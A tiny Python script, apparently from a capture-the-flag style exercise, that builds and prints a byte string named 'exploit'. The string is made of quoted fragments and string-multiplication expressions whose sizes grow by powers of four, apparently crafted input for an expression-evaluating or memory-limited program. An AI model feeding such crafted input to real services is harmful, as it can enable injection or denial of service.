exploit = b""
val = 1
for i in range(12):
    val = val * 4
    exploit += b'\'1\n'+ bytes(str(val), 'utf-8') + b'\'+\'a\'*' + bytes(str(val-1), 'utf-8') + b'+\'\n4\n\'+'

print(exploit)